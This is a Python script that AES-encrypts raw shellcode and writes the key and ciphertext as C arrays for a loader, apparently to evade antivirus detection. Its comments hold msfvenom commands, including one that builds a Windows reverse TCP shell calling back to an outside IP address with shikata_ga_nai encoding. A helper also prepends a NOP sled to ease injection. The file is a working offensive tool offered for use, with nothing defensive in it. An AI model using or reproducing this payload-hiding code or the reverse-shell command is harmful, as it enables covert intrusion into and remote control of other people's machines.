#!/usr/bin/env python
"""shellcode_encryption.py"""
# This script is developed in Windows environment.
# Some testing done in Linux environment, seems to work ok.
# Author: Ari Ketola
from os import urandom
import os
import hashlib
import argparse
from Crypto.Cipher import AES

FILE_PATH = os.path.dirname(__file__) + '/files/'
SHELLCODE_FILE = FILE_PATH + "mess.raw"         # Default shellcode file
KEY = urandom(8)                                # Random urandom key
#msfvenom -p windows/x64/messagebox TEXT='Hello World!' -f raw -o mess.raw
#msfvenom -p windows/x64/shell_reverse_tcp LHOST=81.230.95.134 LPORT=443 -f raw -b
# '\x00\x0a\x0d\x20' -e x86/shikata_ga_nai -o mess.raw
#python .\schellcodeencrypt.py file/mess.raw

def convert_to_c_array(in_data, array_name):
    """Convert data to c array that later can be included in a c program'"""
    c_array = "unsigned char "+ array_name+ "[] = {\n"

    for i, byte in enumerate(in_data): # Add each byte in hexadecimal format
        c_array += f"0x{byte:02x}, "
        if (i + 1) % 8 == 0:    # Add a new line every 8 bytes for readability
            c_array += "\n"

    c_array += "};\n"
    return c_array


def save_to_c_file(file_name, data_to_save, array_name):
    """Save the c code to a file"""
    with open(file_name, "w", encoding="utf-8") as file:
        c_array_code = convert_to_c_array(data_to_save, array_name)
        file.write(c_array_code)
    print(f"{array_name} saved in {file_name}")


def add_padding2(shellcode_to_pad):    # Additional function to try if problem injecting shellcode
    """Sometimes the injection works better with NOPs in the start of shellcode"""
    size = AES.block_size
    padding = size - len(shellcode_to_pad) % size
    padding_before = b"\x90" * 32  # \x90 are NOP (no operation) it´s like padding
    padding = size - len(padding_before + shellcode_to_pad) % size
    return padding_before + shellcode_to_pad + bytes([padding] * padding)


def add_padding(shellcode_pad):
    """Function that pad data, must be padded to %d byte boundary in AES.MODE_CBC"""
    size = AES.block_size
    padding = size - len(shellcode_pad) % size
    return shellcode_pad + bytes([padding] * padding)


def encrypt_shellcode(shellcode_to_encrypt, key):
    """Function that encrypts shellcode with AES encryption"""
    sha256_key = hashlib.sha256(key).digest()
    #block_size = bytes(16)
    shellcode_padded = add_padding(shellcode_to_encrypt)
    cipher = AES.new(sha256_key, AES.MODE_CBC, bytes(16))
    return cipher.encrypt(shellcode_padded)


def shellcode_encrypter(shellcode_file):
    """Function that encrypts shellcode and saves the key and encrypted shellcode"""
    shellcode = open(shellcode_file, "rb").read()
    ciphertext = encrypt_shellcode(shellcode, KEY)

    # Save the encryption key to a file
    save_to_c_file("key_array.c", KEY, "key")
    # Save the shellcode ciphertext to a file
    save_to_c_file("ciphertext_array.c", ciphertext, "payload")


def main_shellcode_encrypter():
    """Main shellcode encryption function to handle commandline arguments"""
    parser = argparse.ArgumentParser(description="Shellcode encryption script that"
                                     "saves encrypted shellcode to a c array in file")

    # Define arguments for encrypting and decrypting
    parser.add_argument(
        'file',
        default=SHELLCODE_FILE,
        nargs='?',
        help=f"The path to the .raw file with the shellcode (default file '{SHELLCODE_FILE}'). "
    )
    # Parse the arguments
    args = parser.parse_args()

    if not os.path.exists(args.file):
        print(f"{os.path.basename(__file__)}: error: file '{args.file}' doesn't exist")
    else:
        shellcode_encrypter(args.file)


if __name__ == "__main__":
    main_shellcode_encrypter()
